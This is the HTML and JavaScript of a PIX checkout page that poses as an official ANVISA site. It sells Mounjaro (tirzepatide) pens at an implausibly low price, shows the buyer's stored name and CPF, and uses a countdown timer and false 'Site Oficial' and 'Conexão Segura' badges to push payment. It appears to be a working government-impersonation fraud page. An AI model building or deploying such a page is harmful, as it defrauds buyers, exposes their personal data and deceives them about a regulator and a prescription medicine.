<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagamento PIX | ANVISA</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f8f9fa;
    }
    
    .main-title {
      font-size: 24px;
      font-weight: 700;
      color: #1351b4;
      margin-bottom: 8px;
    }
    
    .subtitle {
      font-size: 16px;
      color: #666666;
      margin-bottom: 24px;
    }
    
    .sticky-header {
      position: sticky;
      top: 0;
      background-color: white;
      z-index: 50;
      transition: box-shadow 0.3s ease;
    }
    
    .sticky-header.shadow {
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    .secure-badge {
      display: inline-flex;
      align-items: center;
      background-color: #f0f7ff;
      color: #1351b4;
      padding: 6px 12px;
      border-radius: 16px;
      font-size: 12px;
      font-weight: 600;
    }
    
    .secure-badge i {
      margin-right: 4px;
    }
    
    .payment-container {
      background-color: white;
      border-radius: 12px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
      overflow: hidden;
      max-width: 700px;
      margin: 0 auto;
    }
    
    .payment-header {
      background-color: #f0f7ff;
      padding: 20px;
      border-bottom: 1px solid #e0e7ff;
    }
    
    .payment-content {
      padding: 30px;
    }
    
    .btn {
      padding: 12px 20px;
      border-radius: 6px;
      font-weight: 600;
      font-size: 16px;
      transition: all 0.2s ease;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }
    
    .btn-primary {
      background-color: #1351b4;
      color: white;
      border: none;
    }
    
    .btn-primary:hover {
      background-color: #0c3d8a;
    }
    
    .btn-secondary {
      background-color: #f3f4f6;
      color: #4b5563;
      border: 1px solid #d1d5db;
    }
    
    .btn-secondary:hover {
      background-color: #e5e7eb;
    }
    
    .btn i {
      margin-right: 8px;
    }
    
    .vlibras-icon {
      position: fixed;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      z-index: 1000;
    }
    
    .countdown-timer {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    
    .countdown-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0 8px;
    }
    
    .countdown-value {
      width: 50px;
      height: 50px;
      background-color: #1351b4;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 24px;
      font-weight: 700;
    }
    
    .countdown-label {
      margin-top: 4px;
      font-size: 12px;
      color: #6b7280;
    }
    
    .pix-code-container {
      background-color: #f9fafb;
      border-radius: 8px;
      padding: 16px;
      margin: 20px 0;
      border: 1px solid #e5e7eb;
    }
    
    .pix-code-title {
      font-size: 16px;
      font-weight: 600;
      color: #1351b4;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
    }
    
    .pix-code-title i {
      margin-right: 8px;
      color: #1351b4;
    }
    
    .pix-code {
      background-color: white;
      border: 1px dashed #d1d5db;
      border-radius: 4px;
      padding: 12px;
      font-family: monospace;
      font-size: 14px;
      color: #4b5563;
      word-break: break-all;
      max-height: 100px;
      overflow-y: auto;
      margin-bottom: 16px;
    }
    
    .order-summary {
      margin-top: 24px;
      padding-top: 24px;
      border-top: 1px solid #e5e7eb;
    }
    
    .order-summary-title {
      font-size: 18px;
      font-weight: 600;
      color: #1351b4;
      margin-bottom: 16px;
    }
    
    .summary-item {
      display: flex;
      justify-content: space-between;
      margin-bottom: 8px;
    }
    
    .summary-label {
      font-size: 14px;
      color: #6b7280;
    }
    
    .summary-value {
      font-size: 14px;
      font-weight: 500;
      color: #4b5563;
    }
    
    .summary-total {
      display: flex;
      justify-content: space-between;
      margin-top: 12px;
      padding-top: 12px;
      border-top: 1px dashed #e5e7eb;
    }
    
    .total-label {
      font-size: 16px;
      font-weight: 600;
      color: #1f2937;
    }
    
    .total-value {
      font-size: 16px;
      font-weight: 700;
      color: #1351b4;
    }
    
    .instructions {
      margin-top: 24px;
      padding: 16px;
      background-color: #f0f7ff;
      border-radius: 8px;
      border-left: 4px solid #1351b4;
    }
    
    .instructions-title {
      font-size: 16px;
      font-weight: 600;
      color: #1351b4;
      margin-bottom: 8px;
      display: flex;
      align-items: center;
    }
    
    .instructions-title i {
      margin-right: 8px;
      color: #1351b4;
    }
    
    .instructions-list {
      margin-left: 16px;
      margin-top: 8px;
    }
    
    .instructions-list li {
      font-size: 14px;
      color: #4b5563;
      margin-bottom: 6px;
      list-style-type: disc;
    }
    
    .qr-code-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 20px 0;
    }
    
    .qr-code-image {
      width: 220px;
      height: 220px;
      border: 1px solid #e5e7eb;
      border-radius: 8px;
      padding: 8px;
      background-color: white;
    }
    
    .status-badge {
      display: inline-flex;
      align-items: center;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 8px;
    }
    
    .status-pending {
      background-color: #fffbeb;
      color: #d97706;
    }
    
    .status-confirmed {
      background-color: #dcfce7;
      color: #16a34a;
    }
    
    .copy-btn {
      padding: 8px 16px;
      background-color: #f3f4f6;
      border: 1px solid #d1d5db;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      color: #4b5563;
      cursor: pointer;
      display: flex;
      align-items: center;
      transition: all 0.2s ease;
    }
    
    .copy-btn:hover {
      background-color: #e5e7eb;
    }
    
    .copy-btn i {
      margin-right: 6px;
    }
  </style>
</head>
<body>
  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
  <div class="sticky-header">
    <div class="container mx-auto px-4 border-b border-[#0000001a]">
      <div class="flex items-center justify-between py-2">
        <div class="flex items-center">
          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
            Centro de Verificação Digital | ANVISA
          </p>
        </div>
        <div class="flex items-center space-x-4">
          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
        </div>
      </div>
    </div>
  </div>
  
  <div class="container mx-auto px-4">
    <div class="py-4">
      <div class="flex items-center space-x-2 text-[13px]">
        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
        <span class="text-[#9E9D9D]">&gt;</span>
        <span class="font-bold">Pagamento PIX</span>
      </div>
    </div>
  </div>

  <main class="max-w-3xl mx-auto px-4 py-6">
    <div class="mb-6">
      <h2 class="main-title">
        Pagamento via PIX
      </h2>
      <p class="subtitle">
        Escaneie o QR Code ou copie o código PIX para realizar o pagamento
      </p>
    </div>
    
    <div class="flex flex-wrap justify-center gap-3 my-4">
      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
    </div>
    
    <div class="payment-container">
      <div class="payment-header">
        <h3 class="text-lg font-semibold text-[#0c326f]">Mounjaro - Tirzepatida 5mg</h3>
        <div class="flex items-center mt-2">
          <div class="status-badge status-pending">
            <i class="fas fa-clock mr-2"></i> Aguardando Pagamento
          </div>
        </div>
      </div>
      
      <div class="payment-content">
        <div class="text-center mb-4">
          <p class="text-gray-700 mb-2">Este QR Code expira em:</p>
          <div class="countdown-timer" id="countdown">
            <div class="countdown-item">
              <div class="countdown-value" id="minutes">30</div>
              <div class="countdown-label">minutos</div>
            </div>
            <div class="countdown-item">
              <div class="countdown-value" id="seconds">00</div>
              <div class="countdown-label">segundos</div>
            </div>
          </div>
        </div>
        
        <div class="qr-code-container">
          <img id="pixQrCode" src="" alt="QR Code PIX" class="qr-code-image">
          <p class="text-sm text-gray-500 mt-2">Escaneie com o app do seu banco</p>
        </div>
        
        <div class="pix-code-container">
          <h4 class="pix-code-title">
            <i class="fas fa-copy"></i> Código PIX
          </h4>
          <div class="pix-code" id="pixCode"></div>
          <button id="copyButton" class="copy-btn">
            <i class="fas fa-copy"></i> Copiar código PIX
          </button>
        </div>
        
        <div class="instructions">
          <h4 class="instructions-title">
            <i class="fas fa-info-circle"></i> Como pagar com PIX
          </h4>
          <p class="text-sm text-gray-600">Você pode pagar de duas formas:</p>
          <ul class="instructions-list">
            <li>Abra o aplicativo do seu banco, escolha a opção PIX e escaneie o QR Code acima.</li>
            <li>Ou copie o código PIX, abra o aplicativo do seu banco, escolha a opção PIX > Copia e Cola e cole o código.</li>
            <li>Confirme as informações e finalize o pagamento.</li>
            <li>Após o pagamento, você será redirecionado automaticamente para a página de confirmação.</li>
          </ul>
        </div>
        
        <div class="order-summary">
          <h3 class="order-summary-title">Resumo do Pedido</h3>
          
          <div class="summary-item">
            <div class="summary-label">Cliente:</div>
            <div class="summary-value" id="clientName">Carregando...</div>
          </div>
          
          <div class="summary-item">
            <div class="summary-label">CPF:</div>
            <div class="summary-value" id="clientCpf">Carregando...</div>
          </div>
          
          <div class="summary-item">
            <div class="summary-label">Produto:</div>
            <div class="summary-value">Mounjaro (Tirzepatida) 5mg</div>
          </div>
          
          <div class="summary-item">
            <div class="summary-label">Quantidade:</div>
            <div class="summary-value">Ciclo de 3 meses – 4 canetas</div>
          </div>
          
          <div class="summary-item">
            <div class="summary-label">Frete:</div>
            <div class="summary-value">Grátis</div>
          </div>
          
          <div class="summary-total">
            <div class="total-label">Total:</div>
            <div class="total-value" id="totalAmount">R$ 197,90</div>
          </div>
        </div>
        
        <div class="mt-6 text-center">
          <a href="#" id="checkStatusButton" class="btn btn-primary">
            <i class="fas fa-sync-alt"></i> Verificar Status do Pagamento
          </a>

        </div>
      </div>
    </div>
  </main>
  
  <div class="w-full mt-6">
    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
  </div>
  
  <a href="#" class="vlibras-icon">
    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
  </a>
  
  <script>
    // Obter dados do PIX do localStorage
    function getPixData() {
      const pixDataStr = localStorage.getItem('pix_data');
      
      if (!pixDataStr) {
        return { transaction_id: null, pix_code: null, pix_qrcode: null, amount: null };
      }
      
      try {
        return JSON.parse(pixDataStr);
      } catch (e) {
        console.error("Erro ao processar dados do PIX:", e);
        return { transaction_id: null, pix_code: null, pix_qrcode: null, amount: null };
      }
    }
    
    // Inicializar dados da página
    function initializePageData() {
      const { transaction_id, pix_code, pix_qrcode, amount } = getPixData();
      
      // Se não houver dados suficientes, redirecionar para a página de compra
      if (!transaction_id || !pix_code || !pix_qrcode) {
        console.error("Dados insuficientes para exibir a página de pagamento");
        window.location.href = '/compra';
        return;
      }
      
      // Definir código PIX
      document.getElementById('pixCode').textContent = pix_code;
      
      // Definir QR code
      document.getElementById('pixQrCode').src = pix_qrcode;
      
      // Definir valor total se disponível
      if (amount) {
        document.getElementById('totalAmount').textContent = `R$ ${parseFloat(amount).toFixed(2).replace('.', ',')}`;
      }
      
      // Obter e exibir dados do cliente do localStorage
      const nomeCompleto = localStorage.getItem('nomeCompleto') || '';
      const cpfValidado = localStorage.getItem('cpfValidado') || '';
      
      // Formatar CPF para exibição
      const cpfFormatado = formatCPF(cpfValidado);
      
      // Atualizar os elementos na página
      document.getElementById('clientName').textContent = nomeCompleto || 'Cliente Anvisa';
      document.getElementById('clientCpf').textContent = cpfFormatado || 'CPF não disponível';
      
      // Função para formatar CPF (XXX.XXX.XXX-XX)
      function formatCPF(cpf) {
        if (!cpf) return '';
        
        // Remover caracteres não numéricos
        cpf = cpf.replace(/\D/g, '');
        
        // Verificar se o CPF tem 11 dígitos
        if (cpf.length !== 11) return cpf;
        
        // Formatar no padrão XXX.XXX.XXX-XX
        return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
      }
      
      // Configurar botão de verificação de status
      document.getElementById('checkStatusButton').addEventListener('click', function(e) {
        e.preventDefault();
        checkPaymentStatus(transaction_id);
      });
      
      // Configurar botão de cópia
      document.getElementById('copyButton').addEventListener('click', function() {
        copyToClipboard(pix_code);
      });
      
      // Iniciar countdown
      startCountdown(30 * 60); // 30 minutos em segundos
      
      // Checar status automaticamente a cada 10 segundos
      setInterval(function() {
        checkPaymentStatus(transaction_id, true);
      }, 10000);
    }
    
    // Copiar texto para a área de transferência
    function copyToClipboard(text) {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      
      const button = document.getElementById('copyButton');
      const originalText = button.innerHTML;
      button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
      button.style.backgroundColor = '#dcfce7';
      button.style.borderColor = '#86efac';
      button.style.color = '#16a34a';
      
      setTimeout(function() {
        button.innerHTML = originalText;
        button.style.backgroundColor = '';
        button.style.borderColor = '';
        button.style.color = '';
      }, 2000);
    }
    
    // Iniciar contagem regressiva
    function startCountdown(duration) {
      let timer = duration;
      const minutesDisplay = document.getElementById('minutes');
      const secondsDisplay = document.getElementById('seconds');
      
      const countdown = setInterval(function() {
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;
        
        minutesDisplay.textContent = minutes.toString().padStart(2, '0');
        secondsDisplay.textContent = seconds.toString().padStart(2, '0');
        
        if (--timer < 0) {
          clearInterval(countdown);
          alert('O tempo para pagamento expirou. A página será recarregada.');
          window.location.reload();
        }
      }, 1000);
    }
    
    // Verificar status do pagamento
    function checkPaymentStatus(transaction_id, isAutoCheck = false) {
      fetch(`/verificar_pagamento_mounjaro?transaction_id=${transaction_id}`)
        .then(response => response.json())
        .then(data => {
          if (data.status === 'paid' || data.status === 'confirmed' || data.status === 'completed') {
            window.location.href = '/compra_sucesso';
          } else if (!isAutoCheck) {
            alert('Pagamento ainda não confirmado. Por favor, aguarde ou verifique se o pagamento foi realizado corretamente.');
          }
        })
        .catch(error => {
          console.error('Erro ao verificar status:', error);
          if (!isAutoCheck) {
            alert('Erro ao verificar status do pagamento. Por favor, tente novamente.');
          }
        });
    }
    
    // Inicializar quando a página carregar
    window.onload = function() {
      initializePageData();
      
      // Efeito de scroll na barra de navegação
      window.addEventListener('scroll', function() {
        var header = document.querySelector('.sticky-header');
        if (window.pageYOffset > 0) {
          header.classList.add('shadow');
        } else {
          header.classList.remove('shadow');
        }
      });
    };
  </script>
</body>
</html>